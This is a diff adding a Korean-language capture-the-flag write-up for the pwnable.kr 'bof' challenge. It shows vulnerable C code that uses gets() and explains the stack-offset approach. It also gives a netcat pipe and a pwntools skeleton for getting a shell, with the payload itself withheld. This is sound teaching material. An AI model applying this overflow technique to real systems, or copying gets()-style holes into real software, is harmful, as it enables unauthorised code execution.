@@ -39,8 +39,64 @@ $ sudo apt install openjdk-15-jdk
 처음 Ghidra를 실행시켰다면 프로젝트를 생성해야됩니다. Ctrl+N으로 새 프로젝트를 생성한 후, __초록색 용__ 이 있는 버튼을 누르시면 분석할 수 있는 화면이 팝업됩니다. 이제 그 화면에다가 분석을 원하는 바이너리를 드래그 & 드롭 하시면 바이너리 분석을 수행한 후 수행한 화면을 보여줍니다.
 
 ## BOF Writeup
+
+```c
+#include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
+void func(int key){
+	char overflowme[32];
+	printf("overflow me : ");
+	gets(overflowme);	// smash me!
+	if(key == 0xcafebabe){
+		system("/bin/sh");
+	}
+	else{
+		printf("Nah..\n");
+	}
+}
+int main(int argc, char* argv[]){
+	func(0xdeadbeef);
+	return 0;
+}
+```
+
+func의 첫번째 인자를 조작하는 문제이다.  
+gets 함수는 버퍼의 길이에 상관없이 개행이 읽힐 때까지 읽기 때문에 버퍼오버플로우 취약점을 가지고 있다.
+따라서 stack상에 overflowme라는 버퍼의 위치와 func함수의 첫번째 인자인 key의 위치를 파악하면 key값을 변조할 수 있다.
+
+overflowme 버퍼는 gets의 함수의 인자로 사용이 되기 때문에 gets가 호출되기 전 인자가 준비되는 과정을 살펴보면 위치를 알 수 있다.  
+key의 위치는 x86의 calling convention을 알고 있다면 어셈블리 살펴볼 필요 없이 바로 나오겠지만, calling convention을 잘 모를경우, if 조건문안에 key가 사용되니 해당 부분을 살펴보면 된다.
+
 ### Approach
 
+문제의 답을 직접적으로 제공하진 않는다. 그러면 재미없잖아요. 하핳. 하지만 payload의 기본적인 틀은 제공한다.  
+```payload_for_this_problem```은 직접 구해보자. payload를 구성할 때 little endian을 조심해야한다.
+
 ### In Shell
+```sh
+(python3 -c "print('payload_for_this_problem')"; cat) | nc pwnable.kr 9000
+```
+키보드를 이용해서는 전달할 수 없는 바이트값들이 존재하기 때문에 위와 같이 파이썬을 이용하여 전달할 것이다.  
+```(;cat) | ``` 다음과 같은 모양을 사용하는 이유는, shell을 딴 다음에도 shell에 입력을 할 수 있어야 하는데 이 역할을 cat이 해준다.  
+왜냐하면 nc로 들어가는 값은 파이프로 인해 파이프 앞쪽에 있는 명령어들의 stdout과 묶여있기 때문에 cat을 사용하지 않으면 파이썬 명령어가 끝나는 동시에 파이프가 닫히고 nc가 종료되기 때문에 shell을 따도 shell을 사용할 수 없게되기 때문이다.
 
 ### Using pwntools (python)
+```py
+from pwn import *
+
+# nc서버와 연결 remote(ip, port)
+p = remote('pwnable.kr', 9000)
+
+# payload 구성 Hint: p32()함수 요긴하게 사용된다.
+# p32함수의 return값은 bytes다. python3에선 string과 바로 concatenate되지 않을 것이다.
+payload = 'payload_for_this_problem'
+
+# payload 전달
+p.sendline(payload)
+
+# interactive shell환경 제공
+p.interactive()
+```
+
+pwntools사용한 정답은 같이 올려놓은 py파일을 참고하면 된다.
